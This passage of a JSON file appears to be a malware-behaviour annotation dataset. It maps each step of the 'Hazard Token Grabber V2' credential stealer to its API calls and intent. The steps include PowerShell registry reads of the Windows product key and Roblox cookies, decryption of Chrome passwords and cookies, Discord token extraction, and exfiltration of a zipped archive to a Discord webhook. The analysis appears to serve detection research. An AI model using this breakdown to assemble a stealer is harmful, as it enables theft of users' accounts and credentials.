              "object": "bd, 'w', newline='', encoding='cp437', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Determine_local_file_presence",
              "intention_id": "determine_local_file_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{file_name}', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "regex, line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "self.checkToken(token)",
              "object_description": "Account credentials",
              "object_id": "account_credentials",
              "intention_description": "Check validity of authentication cookie",
              "intention_id": "check_authentication_cookie"
            },
            {
              "action_api": "b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming+'\\discord\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "b64decode(...), self.get_master_key(...)",
              "object_description": "Decompressed data with key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming+'\\discord\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Determine_local_state_file_presence",
              "intention_id": "determine_local_state_file_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming+'\\Mozilla\\Firefox\\Profiles'",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "Determine_browser_profile_presence",
              "intention_id": "determine_browser_profile_presence"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.roaming+'\\Mozilla\\Firefox\\Profiles'",
              "object_description": "Browser profile directory",
              "object_id": "browser_profile_directory",
              "intention_description": "List Firefox profile files",
              "intention_id": "list_firefox_profile_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{_file}', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "regex, line",
              "object_description": "Regex file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "self.checkToken(token)",
              "object_description": "Account credentials",
              "object_id": "account_credentials",
              "intention_description": "Check validity of authentication cookie",
              "intention_id": "check_authentication_cookie"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.appdata+'\\Google\\Chrome\\User Data\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "login_db, login",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "login",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.dir+'\\Google Passwords.txt', 'w', encoding='cp437', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT action_url, username_value, password_value FROM logins\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser passwords",
              "intention_id": "query_browser_passwords"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser password data",
              "intention_id": "extract_browser_password_data"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "encrypted_password, master_key",
              "object_description": "Decompressed data with key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"Domain: {url}\\nUser: {username}\\nPass: {decrypted_password}\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write password data to file",
              "intention_id": "write_password_data_file"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "login",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.appdata+'\\Google\\Chrome\\User Data\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "login_db, login",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy database to temporary location",
              "intention_id": "copy_database_temp_location"
            },
            {
              "action_api": "sqlite3.connect()",
              "action_description": "Opens SQLite database file",
              "action_id": "open_sqlite_db",
              "object": "login",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open SQLite database",
              "intention_id": "open_sqlite_database"
            },
            {
              "action_api": "conn.cursor()",
              "action_description": "Creates cursor object",
              "action_id": "create_sql_cursor",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Create database cursor",
              "intention_id": "create_database_cursor"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.dir+'\\Google Cookies.txt', 'w', encoding='cp437', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "cursor.execute()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"SELECT host_key, name, encrypted_value from cookies\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Query browser cookies",
              "intention_id": "query_browser_cookies"
            },
            {
              "action_api": "cursor.fetchall()",
              "action_description": "Fetches all rows from last executed query",
              "action_id": "fetch_sql_rows",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Extract browser cookies data",
              "intention_id": "extract_browser_cookies_data"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "r[2], master_key",
              "object_description": "Decompressed data with key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt browser cookie value",
              "intention_id": "decrypt_browser_cookie"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"Host: {host}\\nUser: {user}\\nCookie: {decrypted_cookie}\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "self.robloxcookies.append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "decrypted_cookie",
              "object_description": "Cookie data string",
              "object_id": "cookie_data_string",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "cursor.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "conn.close()",
              "action_description": "Closes the SQLite database connection",
              "action_id": "close_sqlite_connection",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close database connection",
              "intention_id": "close_database_connection"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "login",
              "object_description": "Temporary file path",
              "object_id": "temporary_file_path",
              "intention_description": "Delete temporary database",
              "intention_id": "delete_temporary_database"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers=self.getHeaders(token)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl+'/billing/payment-sources', headers=self.getHeaders(token)",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.dir+'\\Discord Info.txt', 'w', encoding='cp437', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write token data to file",
              "intention_id": "write_token_data_file"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "self.robloxcookies.append()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "reg_cookie",
              "object_description": "Cookie data string",
              "object_id": "cookie_data_string",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.dir+'\\Roblox Cookies.txt', 'w'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "fp.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "i+'\\n'",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write cookies data to file",
              "intention_id": "write_cookies_data_file"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, 'r', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "path",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, 'w', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"ðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, 'a', encoding='utf-8'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "fp.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "x+\"\\n\\nðŸŒŸãƒ»Grabber By github.com/Rdimoãƒ»https://github.com/Rdimo/Hazard-Token-Grabber-V2\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "psutil.virtual_memory()",
              "action_description": "Retrieves system virtual memory statistics",
              "action_id": "get_virtual_memory",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "psutil.disk_usage()",
              "action_description": "Retrieves disk usage statistics (total, used, free) for given path",
              "action_id": "get_disk_usage",
              "object": "'/'",
              "object_description": "Root directory",
              "object_id": "root_directory",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "httpx.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://ipinfo.io/json\"",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.getlogin()",
              "action_description": "Retrieves current user login name",
              "action_id": "get_username",
              "object": "",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.appdata, f'Hazard.V2-[{os.getlogin()}].zip'",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Opens ZIP archive for writing",
              "action_id": "open_zip_write",
              "object": "_zipfile, 'w', zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
              "action_id": "path_special_operations",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.abspath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "os.path.join(dirname, filename)",
              "object_description": "Directory path with file",
              "object_id": "directory_path_with_file",
              "intention_description": "Prepare path for file operations",
              "intention_id": "prepare_path_file_operations"
            },
            {
              "action_api": "zipped_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "absname, arcname",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Add file to archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zipped_file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "self.dir",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "self.webhook, json=embed",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send data to server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "_zipfile, 'rb'",
              "object_description": "ZIP archive",
              "object_id": "zip_archive",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "self.webhook, files={'upload_file': f}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "ZIP archive",
              "object_id": "zip_archive",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "Hazard_Token_Grabber_V2().init()",
              "object_description": "",
              "object_id": "",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            }
          ]
        }
      ]
    }
  ]
}